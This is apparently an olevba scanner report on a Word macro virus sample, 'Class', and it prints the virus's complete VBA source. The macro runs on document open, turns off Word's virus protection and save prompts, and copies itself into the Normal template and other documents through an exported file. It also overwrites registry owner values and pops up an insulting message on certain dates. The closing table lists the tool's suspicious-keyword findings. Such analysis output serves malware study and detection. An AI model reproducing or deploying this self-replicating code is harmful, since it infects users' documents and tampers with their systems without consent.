olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-16194cffd5d2f525b2d0478d9d525fe8df36795a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-16194cffd5d2f525b2d0478d9d525fe8df36795a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
Const REG_SZ As Long = 1
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
Const HKEY_CURRENT_USER As Long = &H80000001
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
Sub AutoOpen()
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
On Error GoTo out
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
Options.VirusProtection = False
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
Options.SaveNormalPrompt = False
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
Options.ConfirmConversions = False
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
If nt > 70 And ad > 0 Then GoTo out
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
If nt < 70 Then
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
End If
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
host.codemodule.AddFromFile ("c:\class.sys")
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
With host.codemodule
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    For x = 1 To 16
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    .deletelines 1
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    Next x
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
End With
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
If nt < 70 Then
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    With host.codemodule
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    .replaceline 1, "Sub AutoClose()"
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    .replaceline 91, "Sub ToolsMacro()"
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    For x = 70 To 81
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
        .deletelines 62
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    Next x
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    .replaceline 35, "    For x = 1 To 4"
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    End With
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
End If
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
If nt < 70 Then
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
u = RegCloseKey(k)
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
End If
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
With host.codemodule
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    For x = 2 To 104 Step 2
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
    Next x
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
End With
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
out:
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
End Sub
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
Sub ViewVBCode()
'Janis1/12/2001 1:26:23 PMHP DeskJet 690C Series v11.0 on LPT1:IZDEVUMI
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

